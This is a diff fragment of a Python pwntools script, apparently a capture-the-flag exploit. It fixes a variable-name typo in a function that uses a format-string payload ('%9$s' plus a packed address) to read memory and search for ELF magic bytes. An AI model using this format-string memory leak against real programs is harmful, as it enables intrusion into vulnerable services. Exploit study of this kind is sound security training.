@@ -81,8 +81,8 @@ def search_elf_magic_bytes(leaked_main,addr):
 		leak_part = b"%9$sEOF" + b"\x00"
 		try:
 			io.sendline(leak_part + p64(leaked_main + addr))
-			resp = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
-			leak = resio.split(b"EOF")[0] + b"\x00"
+			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
+			leak = res.split(b"EOF")[0] + b"\x00"
 			print("Deferenced pointer: " + leak.decode("unicode_escape"))
 			if b"\x7FELF" in leak:
 				magic_bytes = leaked_main + addr
